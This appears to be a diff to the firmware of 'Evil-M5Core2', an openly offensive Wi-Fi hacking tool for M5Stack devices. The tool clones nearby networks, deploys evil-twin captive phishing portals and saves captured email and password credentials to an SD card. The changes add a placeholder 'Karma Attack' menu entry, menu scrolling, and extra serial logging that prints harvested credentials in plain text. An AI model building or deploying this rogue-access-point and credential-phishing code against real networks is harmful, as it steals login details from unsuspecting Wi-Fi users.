@@ -47,8 +47,14 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials", "Monitor Status" };
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change portal", "Check credentials", "Delete Credentials", "Monitor Status", "Karma Attack" };
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
+
+const int maxMenuDisplay = 9; // Nombre maximum d'éléments de menu affichés en même temps
+int menuStartIndex = 0;       // Index du premier élément de menu à afficher
+
+
+
 String ssidList[100];
 int numSsid = 0;
 bool isOperationInProgress = false;
@@ -109,11 +115,11 @@ void setup() {
     "Initiating Protocol 47...",
     " The Gibson is in Sight.",
     "  Running the Matrix...",
-    "Neural Networks Syncing...",
+    "Neural Networks Syncing..",
     "Quantum Algorithm started",
     "Digital Footprint Erased.",
     "   Uploading Virus...",
-    "Downloading Internet...",
+    "Downloading Intenret...",
     "  Root Access Granted.",
     "Cyberpunk Mode: Engaged.",
     "  Zero Days Exploited.",
@@ -134,7 +140,6 @@ void setup() {
     " Death Star loading ...",
     " Initiating Tesseract...",
     "  Decrypting Voynich...",
-    "Charging at 2,21 GigaWatt",
     "   Hacking the Gibson...",
     "   Orbiting Planet X...",
     "  Accessing SHIELD DB...",
@@ -155,6 +160,12 @@ void setup() {
     "Decrypting the Code...",
     "Solving the Labyrinth...",
     "Escaping the Matrix...",
+    " You know I-Am-Jakoby ?",
+    "You know TalkingSasquach?",
+    "Neural Networks Syncing..",
+    "Neural Networks Syncing..",
+    
+    "Neural Networks Syncing..",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -174,17 +185,17 @@ void setup() {
 
   M5.Display.setCursor(85, textY);
   M5.Display.println(" Evil-M5Core2");
-  Serial.println("---------------------");  
+  Serial.println("-------------------");  
   Serial.println(" Evil-M5Core2");
   M5.Display.setCursor(80, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   Serial.println("By 7h30th3r0n3");
-  Serial.println("---------------------"); 
+  Serial.println("-------------------"); 
   M5.Display.setCursor(10, textY + 120);
   M5.Display.println(randomMessage);
   Serial.println(" ");
   Serial.println(randomMessage);
-  Serial.println("---------------------"); 
+  Serial.println("-------------------"); 
   firstScanWifiNetworks();
   if (strcmp(ssid, "") != 0) {
         WiFi.mode(WIFI_MODE_APSTA);
@@ -203,11 +214,13 @@ void setup() {
             Serial.println("Fail to connect to Wifi or timeout...");
         }
     } else {
-        Serial.println("SSID is empty, skipping Wi-Fi connection.");
+        Serial.println("SSID is empty.");
+        Serial.println("Skipping Wi-Fi connection.");
     }
   
   if (!SD.begin(SDCARD_CSPIN, SPI, 25000000)) {
-    Serial.println("Error.. SD card not mounted...");
+    Serial.println("Error..");
+    Serial.println("SD card not mounted...");
     return;
   }
   Serial.println("SD card initialized !! ");
@@ -246,13 +259,13 @@ void firstScanWifiNetworks() {
     } else {
         Serial.print(n);
         Serial.println(" Near Wifi Networks : ");
-        Serial.println("-------------------------");
+        Serial.println("-------------------");
         numSsid = min(n, 100);
         for (int i = 0; i < numSsid; i++) {
             ssidList[i] = WiFi.SSID(i);
             Serial.println(ssidList[i]);
         }
-        Serial.println("-------------------------");
+        Serial.println("-------------------");
     }
 }
 
@@ -306,48 +319,60 @@ void executeMenuItem(int index) {
     case 8: 
       displayMonitorPage1();
       break;
+    case 9: 
+      karmaAttack();
+      break;
   }
   isOperationInProgress = false;
 }
 
-
 void handleMenuInput() {
-  if (M5.BtnA.wasPressed()) {
-    currentIndex--;
-    if (currentIndex < 0) {
-      currentIndex = menuSize - 1; 
+    if (M5.BtnA.wasPressed()) {
+        currentIndex--;
+        if (currentIndex < 0) {
+            currentIndex = menuSize - 1;
+        }
+    } else if (M5.BtnC.wasPressed()) {
+        currentIndex++;
+        if (currentIndex >= menuSize) {
+            currentIndex = 0;
+        }
     }
-  } else if (M5.BtnC.wasPressed()) {
-    currentIndex++;
-    if (currentIndex >= menuSize) {
-      currentIndex = 0;  
+
+    // Mise à jour de menuStartIndex pour gérer le défilement
+    menuStartIndex = max(0, min(currentIndex, menuSize - maxMenuDisplay));
+
+    if (M5.BtnB.wasPressed()) {
+        executeMenuItem(currentIndex);
     }
-  } else if (M5.BtnB.wasPressed()) {
-    executeMenuItem(currentIndex);
-  }
 }
+
 
 void drawMenu() {
     M5.Display.clear();
     M5.Display.setTextSize(2);
     M5.Display.setTextFont(1);
 
-    int lineHeight = 24; 
+    int lineHeight = 24;
     int startX = 10;
     int startY = 25;
 
-    for (int i = 0; i < menuSize; i++) {
-        if (i == currentIndex) {
+    for (int i = 0; i < maxMenuDisplay; i++) {
+        int menuIndex = menuStartIndex + i;
+        if (menuIndex >= menuSize) break; // Ne pas dépasser le nombre total d'éléments
+
+        if (menuIndex == currentIndex) {
             M5.Display.fillRect(0, startY + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
             M5.Display.setTextColor(TFT_GREEN);
         } else {
             M5.Display.setTextColor(TFT_WHITE);
         }
         M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 8);
-        M5.Display.println(menuItems[i]);
+        M5.Display.println(menuItems[menuIndex]);
     }
     M5.Display.display();
 }
+
 
 
 void scanWifiNetworks() {
@@ -360,17 +385,26 @@ void scanWifiNetworks() {
     M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
     M5.Display.setCursor(50 , M5.Display.height()/ 2 );
     M5.Display.print("Scan in progress... ");
+    Serial.println("-------------------");
+    Serial.println("WiFi Scan in progress... ");
     M5.Display.display();
     n = WiFi.scanNetworks();
     if (n != WIFI_SCAN_RUNNING) break;
   }
+  Serial.println("-------------------");
+  Serial.println("Near Wifi Network : ");
   numSsid = min(n, 100);
   for (int i = 0; i < numSsid; i++) {
     ssidList[i] = WiFi.SSID(i);
+    Serial.println(ssidList[i]);
   }
   WiFi.mode(WIFI_MODE_APSTA);
   WiFi.begin(ssid, password);
+  Serial.println("-------------------");
+  Serial.println("WiFi Scan Completed ");
+  Serial.println("-------------------");
   waitAndReturnToMenu("Scan Completed");
+  
 }
 
 
@@ -408,7 +442,11 @@ while (!inMenu) {
       showWifiList(); 
     } else if (M5.BtnB.wasPressed()) {
       inMenu = true;
+      Serial.println("-------------------");
+      Serial.println("SSID " +ssidList[currentListIndex] + " selected");
+      Serial.println("-------------------");
       waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
+      
     }
   }
 }
@@ -449,6 +487,13 @@ void showWifiDetails(int networkIndex) {
     M5.Display.println("Back");
     
     M5.Display.display();
+    Serial.println("-------------------");
+    Serial.println("SSID: " + ssidList[networkIndex]);
+    Serial.println("Channel: " + String(WiFi.channel(networkIndex)));
+    Serial.println("Security: " + security);
+    Serial.println("Signal: " + String(rssi) + " dBm");
+    Serial.println("MAC: " + macAddress);
+    Serial.println("-------------------");
 
     while (!inMenu) {
       M5.update();
@@ -456,6 +501,7 @@ void showWifiDetails(int networkIndex) {
         cloneSSIDForCaptivePortal(ssidList[networkIndex]);
         inMenu = true;
         waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
+        Serial.println(ssidList[networkIndex] + " Cloned...");
         drawMenu(); 
       } else if (M5.BtnB.wasPressed()) {
         inMenu = true;
@@ -561,6 +607,9 @@ void createCaptivePortal() {
     });
 
     server.begin();
+     Serial.println("-------------------");
+     Serial.println("Portal " + ssid + " Deployed with " + selectedPortalFile.substring(7) + " Portal !");
+     Serial.println("-------------------");
     waitAndReturnToMenu("     Portal\n        " + ssid + "\n        Deployed");
 }
 
@@ -670,8 +719,14 @@ void handleFileUpload() {
             Serial.print("Upload End: ");
             Serial.println(upload.totalSize);
             server.send(200, "text/plain", "File Uploaded Successfully");
+            Serial.println("-------------------");
+            Serial.println("File Uploaded Successfully");
+            Serial.println("-------------------");
         } else {
             server.send(500, "text/plain", "500: couldn't create file");
+            Serial.println("-------------------");
+            Serial.println("500: couldn't create file");
+            Serial.println("-------------------");
         }
     }
 }
@@ -691,11 +746,20 @@ void handleFileDelete() {
     if (SD.exists(fileName)) {
         if (SD.remove(fileName)) {
             server.send(200, "text/plain", "File deleted successfully");
+            Serial.println("-------------------");
+            Serial.println("File deleted successfully");
+            Serial.println("-------------------");
         } else {
             server.send(500, "text/plain", "File could not be deleted");
+            Serial.println("-------------------");
+            Serial.println("File could not be deleted");
+            Serial.println("-------------------");
         }
     } else {
         server.send(404, "text/plain", "File not found");
+        Serial.println("-------------------");
+        Serial.println("File not found");
+        Serial.println("-------------------");
     }
 }
 
@@ -716,7 +780,9 @@ void saveCredentials(const String& email, const String& password) {
         file.println("Password:" + password);
         file.println("----------------------");
         file.close();
-        Serial.println("Credentials " + email + ":" + password + " saved");
+        Serial.println("-------------------");
+        Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
+        Serial.println("-------------------");
     } else {
         Serial.println("Error opening file for writing");
     }
@@ -782,6 +848,9 @@ void changePortal() {
         } else if (M5.BtnB.wasPressed()) {
             selectedPortalFile = portalFiles[portalFileIndex];
             inMenu = true;
+            Serial.println("-------------------");
+            Serial.println(selectedPortalFile.substring(7) + " portal selected.");
+            Serial.println("-------------------");
             waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected"); 
         }
     }
@@ -872,13 +941,13 @@ void checkCredentials() {
     }
 }
 
-bool confirmDeletePopup() {
+bool confirmPopup(String message) {
   bool confirm = false;
   bool decisionMade = false;
   
   M5.Display.clear();
   M5.Display.setCursor(50, M5.Display.height()/2);
-  M5.Display.println("Delete credentials?");
+  M5.Display.println(message);
   M5.Display.setCursor(37, 220);
   M5.Display.println("Yes");
   M5.Display.setCursor(254, 220);
@@ -900,7 +969,7 @@ bool confirmDeletePopup() {
 }
 
 void deleteCredentials() {
-    if (confirmDeletePopup()) {
+    if (confirmPopup("Delete credentials?")) {
         File file = SD.open("/credentials.txt", FILE_WRITE);
         if (file) {
             file.close();
@@ -1075,6 +1144,10 @@ String getRamUsage() {
     return String(buffer);
 }
 
+
+void karmaAttack() {
+  waitAndReturnToMenu("        soon");
+}
 
 void waitAndReturnToMenu(String message) {
   M5.Display.clear();
